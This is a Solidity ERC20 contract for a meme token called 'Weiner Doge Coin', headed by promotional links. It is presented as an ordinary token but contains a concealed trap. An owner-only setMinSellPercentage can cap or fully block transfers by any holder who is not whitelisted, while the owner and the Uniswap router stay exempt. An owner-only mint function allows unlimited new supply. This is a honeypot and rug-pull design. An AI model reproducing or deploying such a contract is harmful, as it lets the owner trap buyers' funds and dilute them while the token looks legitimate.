// SPDX-License-Identifier: MIT

/*
    website: https://weinerdoge.com/
    telegram: https://t.me/+2BX534OBQ6BkNWE5
    twitter: https://twitter.com/weinerdoge_

*/

pragma solidity ^0.8.0;

import "./ERC20.sol";
import "./Ownable.sol";

contract WeinerDogeCoin is ERC20, Ownable {

    uint256 public minSellPercentage = 100;
    mapping(address => bool) public whitelist;

    constructor(uint256 initialSupply) ERC20("Weiner Doge Coin", "WDC") Ownable(msg.sender) {
        _mint(msg.sender, initialSupply * 1e18);
        //Uniswap Address
        addToWhitelist(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        addToWhitelist(msg.sender);

    }

    function setMinSellPercentage(uint256 _percentage) external onlyOwner {
        minSellPercentage = _percentage;
    }

    function addToWhitelist(address _address) public onlyOwner {
        whitelist[_address] = true;
    }

    function removeFromWhitelist(address _address) external onlyOwner {
        whitelist[_address] = false;
    }

    function isWhitelisted(address _address) external view returns (bool) {
        return whitelist[_address];
    }

    function mint(uint256 amount) external onlyOwner {
        _mint(msg.sender, amount * 1e18);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        require(
            amount <= (balanceOf(msg.sender) * minSellPercentage) / 100 || whitelist[msg.sender],
            "Exceeds maximum transfer percentage"
        );
        return super.transfer(recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        require(
            amount <= (balanceOf(sender) * minSellPercentage) / 100 || whitelist[sender],
            "Exceeds maximum transfer percentage"
        );
        return super.transferFrom(sender, recipient, amount);
    }
}
